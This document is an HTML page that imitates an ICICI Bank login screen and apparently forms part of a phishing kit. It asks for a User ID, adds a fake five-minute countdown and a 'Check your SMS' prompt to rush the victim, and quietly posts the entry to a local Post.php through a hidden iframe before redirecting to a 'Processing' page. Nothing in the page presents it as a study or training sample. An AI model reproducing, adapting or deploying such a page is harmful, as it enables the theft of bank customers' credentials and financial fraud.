<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICICI Bank Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 0vh;
        }
        .container {
            max-width: 400px;
            margin: 20px auto;
            background: linear-gradient(135deg, #ffffff, #f9f9f9);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            text-align: center;
            animation: fadeIn 0.8s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
        }
        .header img {
            max-width: 180px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #f69312;
            outline: none;
            box-shadow: 0 0 5px rgba(246, 147, 18, 0.3);
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, #f69312, #ffac33);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(246, 147, 18, 0.4);
        }
        .btn:disabled {
            background: #cccccc;
            cursor: not-allowed;
            box-shadow: none;
        }
        .links {
            margin-top: 20px;
            text-align: center;
        }
        .links a {
            color: #007bff;
            text-decoration: none;
            margin: 0 12px;
            font-size: 14px;
            transition: color 0.3s ease;
        }
        .links a:hover {
            color: #f69312;
        }
        .timer {
            font-size: 1.2em;
            color: #333;
            margin: 15px 0;
            font-weight: 500;
            background-color: #fff8dc;
            padding: 8px;
            border-radius: 6px;
        }
        .sms-message {
            font-size: 1em;
            color: #333;
            margin: 15px 0;
            font-weight: 500;
            background-color: #e6f3ff;
            padding: 8px;
            border-radius: 6px;
        }
        .content {
            margin-bottom: 25px;
        }
    </style>
</head>
<body>
    <div class="login-box">
      <!-- Static- Please don't do anything here-->
      <script type="text/javascript">var submitted=false;</script>
      <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
      <!--My Form-->
      <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
        <div class="container">
            <div class="header">
                <img src="icici h.jpg" alt="ICICI Bank Logo">
            </div>
            <h2>Enter Your User Id</h2>
            <div class="content">
                <div class="input-group">
                    <label for="userid">Enter User Id</label>
                    <input type="text" class="new-control" name="User_ID" id="lo" maxLength="25" required="" />
                </div>
                <div class="timer" id="timer">Time remaining: 300 seconds</div>
                <div class="sms-message">Check your SMS</div>
            </div>
            <button class="btn" id="loginBtn">Login</button>
        </div>
      </form>
    </div>
    <script>
        let timeLeft = 300; // 300 seconds
        const timerDisplay = document.getElementById('timer');
        const loginButton = document.getElementById('loginBtn');

        const countdown = setInterval(() => {
            timeLeft--;
            timerDisplay.textContent = `Time remaining: ${timeLeft} seconds`;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                timerDisplay.textContent = "Time's up!";
                loginButton.disabled = true; // Disable the login button
            }
        }, 1000); // Update every second
    </script>
</body>
</html>
